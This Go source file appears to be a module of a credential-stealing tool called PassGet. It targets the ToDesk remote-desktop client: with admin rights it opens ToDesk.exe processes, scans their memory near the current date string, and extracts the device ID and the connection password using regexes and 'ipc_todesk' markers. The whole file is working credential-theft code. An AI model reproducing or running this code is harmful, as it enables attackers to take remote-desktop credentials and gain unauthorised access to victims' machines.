package todesk

import (
	"PassGet/modules/utils"
	"PassGet/modules/utils/remote"
	"bytes"
	"fmt"
	"golang.org/x/sys/windows"
	"regexp"
	"strconv"
)

type Client struct {
	ID          string
	Pass        string
	InstallPath string
	ProcName    string
	ProcId      string
	procs       []utils.Proc
}

func Get() *Client {
	C := new(Client)
	if utils.CheckIsAdmin() {
		C.procs = remote.GetProcessList("ToDesk.exe")
		if C.procs != nil {
			C.GetFromProcess()
		}
		if C.ID != "" && C.Pass != "" {
			return C
		}
		fmt.Println("Get From Process Failed.")
	}
	return nil
}
func (C *Client) GetFromProcess() {
	currentDate := utils.GetCurrentDateString("20060102")
	pattern := []byte(currentDate)
	//ipc_todesk
	for _, proc := range C.procs {
		handle, err := remote.OpenProcess(proc.PID)
		if err != nil {
			continue
		}
		defer windows.CloseHandle(handle)
		IDs, _, err := remote.SearchMemory(handle, pattern, false)
		if err != nil {
			continue
		}
		for _, id := range IDs {
			startAddress := id - 250
			if startAddress < 0 {
				startAddress = 0
			}
			data, err := remote.ReadMemory(handle, startAddress, 300)
			if err != nil {
				continue
			}

			dataStr := string(data)

			numberPattern := regexp.MustCompile(`\b\d{9}\b`)
			number := numberPattern.FindString(dataStr)
			if number != "" {
				//fmt.Printf("在地址 %x 的上下文中找到的第一个9位纯数字: %s\n", id, number)
				C.ID = number
			}
		}
		_, PassByteData, err := remote.SearchMemory(handle, pattern, true)
		if err != nil {
			continue
		}
		pblock := findPattern(PassByteData, []byte("ipc_todesk"), []byte(C.ID))
		passwordPattern := regexp.MustCompile(`\b[a-zA-Z0-9!@#$%^&*()]{8}\b`)
		//passwordPattern := regexp.MustCompile(``)
		p := passwordPattern.FindString(string(pblock))
		if p != "" {
			C.Pass = C.Pass + fmt.Sprintf("[%s],", p)
			C.InstallPath = proc.Path
			C.ProcName = proc.Name
			C.ProcId = strconv.Itoa(int(proc.PID))
		}
		windows.CloseHandle(handle)
	}
}
func findPattern(data []byte, startPattern, endPattern []byte) []byte {
	startIndex := bytes.Index(data, startPattern)
	if startIndex == -1 {
		return nil
	}

	endIndex := bytes.Index(data[startIndex:], endPattern)
	if endIndex == -1 {
		return nil
	}

	return data[startIndex : startIndex+endIndex+len(endPattern)]
}
